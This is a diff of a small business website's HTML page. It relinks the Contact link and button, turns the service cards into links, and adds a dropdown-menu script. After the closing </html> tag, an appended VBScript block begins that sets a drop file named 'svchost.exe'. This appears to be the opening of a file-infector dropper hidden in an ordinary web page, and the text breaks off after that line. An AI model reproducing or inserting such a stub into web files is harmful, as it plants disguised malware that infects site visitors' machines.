@@ -54,7 +54,7 @@ Operational Solutions
 
 </div>
 
-<a href="partnerships.html">Contact</a>
+<a href="work-together.html">Contact</a>
 
 </nav>
 
@@ -78,29 +78,37 @@ Operational Solutions
   </p>
 </section>
 
-<!-- COLLABORATION -->
-<section>
+<div class="grid">
 
-  <div class="section-title">
-    <h2>Areas of Collaboration</h2>
-  </div>
+<a href="financial.html" class="card">
 
-  <div class="grid">
+<div class="icon">
+<i class="fa-solid fa-coins"></i>
+</div>
 
-    <div class="card">
-      <div class="icon"><i class="fa-solid fa-coins"></i></div>
-      <h3>Financial Support</h3>
-      <p>Business analysis, planning and decision support.</p>
-    </div>
+<h3>Financial Support</h3>
 
-    <div class="card">
-      <div class="icon"><i class="fa-solid fa-gears"></i></div>
-      <h3>Operational Support</h3>
-      <p>Efficiency improvement and workflow optimization.</p>
-    </div>
+<p>
+Business analysis, planning and decision support.
+</p>
 
-  </div>
+</a>
 
+<a href="operational.html" class="card">
+
+<div class="icon">
+<i class="fa-solid fa-gears"></i>
+</div>
+
+<h3>Operational Support</h3>
+
+<p>
+Efficiency improvement and workflow optimization.
+</p>
+
+</a>
+
+</div>
 </section>
 
 <!-- STEPS -->
@@ -142,10 +150,13 @@ Operational Solutions
 <!-- CTA -->
 <section class="cta">
   <h2>Explore Partnership Opportunities</h2>
-  <p>Let’s build tailored solutions for your business.</p>
+  <p>Let's build tailored solutions for your business.</p>
 
-  <a href="#" class="btn">Contact Us</a>
-  <section class="contact-section">
+  <a href="work-together.html" class="btn">
+Contact Us
+</a>
+
+</div>
 
 <div class="contact-icons">
 
@@ -177,6 +188,36 @@ target="_blank"
 </a>
 
 </div>
+    
+    <script>
+
+document.addEventListener("DOMContentLoaded", function(){
+
+const dropbtn = document.querySelector(".dropbtn");
+const dropdown = document.querySelector(".dropdown");
+
+dropbtn.addEventListener("click", function(e){
+
+e.preventDefault();
+e.stopPropagation();
+
+dropdown.classList.toggle("active");
+
+});
+
+document.addEventListener("click", function(e){
+
+if(!dropdown.contains(e.target)){
+
+dropdown.classList.remove("active");
+
+}
+
+});
+
+});
+
+</script>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
